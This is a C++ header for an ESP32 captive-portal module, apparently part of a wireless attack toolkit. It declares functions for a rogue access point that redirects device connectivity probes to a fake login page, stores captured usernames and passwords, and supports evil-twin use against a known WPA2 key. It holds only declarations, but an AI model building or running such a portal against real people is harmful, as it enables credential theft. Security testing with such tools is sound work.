/*
 * wifi_portal.h - Shared SoftAP + DNS + HTTP captive portal.
 *
 * Used by wifi_honeypot.cpp, wifi_karma.cpp, wifi_captive.cpp.
 *
 * All functions are no-ops unless compiled with BS_WIFI_ESP32 + ARDUINO_ARCH_ESP32.
 * Call from C++ only.
 */
#pragma once
#ifdef __cplusplus

#include <stdint.h>

/* ── Credential storage ──────────────────────────────────────────────────── */

#define WIFI_PORTAL_MAX_CREDS  32
#define WIFI_PORTAL_FIELD_LEN  64

typedef struct {
    char user[WIFI_PORTAL_FIELD_LEN];
    char pass[WIFI_PORTAL_FIELD_LEN];
} wifi_portal_cred_t;

/*
 * Start a SoftAP + DNS catch-all + HTTP captive portal with credential-capture
 * login form.
 *
 *   ssid    - AP SSID (truncated at 32 bytes)
 *   channel - WiFi channel (1-13; 0 defaults to 1)
 *
 * Returns true on success.
 *
 * Internally:
 *   - calls bs_wifi_monitor_stop() to exit any prior monitor mode
 *   - uses Arduino WiFi.softAP() for reliable DHCP/DNS (AP IP = DNS server)
 *   - enables DHCP Option 114 (Captive Portal URI) on arduino-esp32 >= 3.x
 *     so devices learn the portal URL without HTTP probing
 *   - starts DNSServer (port 53, catch-all) and WebServer (port 80)
 *   - serves a "Network Login" credential-capture form on /
 *   - all OS probe endpoints (Android /generate_204, iOS /hotspot-detect.html,
 *     Windows /ncsi.txt, etc.) return 302 → / to trigger the popup
 *   - POST /login stores username+password; GET /ok shows success
 */
/*
 * password - optional WPA2 PSK (must be 8-63 chars to activate WPA2).
 *            Pass nullptr or "" for an open AP.
 *            WPA2 mode only triggers device auto-connect if the password is
 *            correct — use this for evil-twin against a known PSK.
 */
bool wifi_portal_start(const char* ssid, uint8_t channel,
                       const char* password = nullptr);

/* Stop the captive portal.  Restores WiFi STA mode.  Safe if not started. */
void wifi_portal_stop(void);

/*
 * Poll DNS + HTTP servers.  Must be called from the main loop (~10 ms interval)
 * while the portal is running.
 */
void wifi_portal_poll(void);

/* Returns current SoftAP client count. */
int wifi_portal_client_count(void);

/* Returns true if the portal has been started and not yet stopped. */
bool wifi_portal_active(void);

/* Number of captured credentials (0 after wifi_portal_cred_clear). */
int wifi_portal_cred_count(void);

/*
 * Return pointer to captured credential at index idx (0-based).
 * Returns NULL if idx is out of range.  Pointer is valid until stop/clear.
 */
const wifi_portal_cred_t* wifi_portal_get_cred(int idx);

/* Erase all captured credentials. */
void wifi_portal_cred_clear(void);

#endif /* __cplusplus */
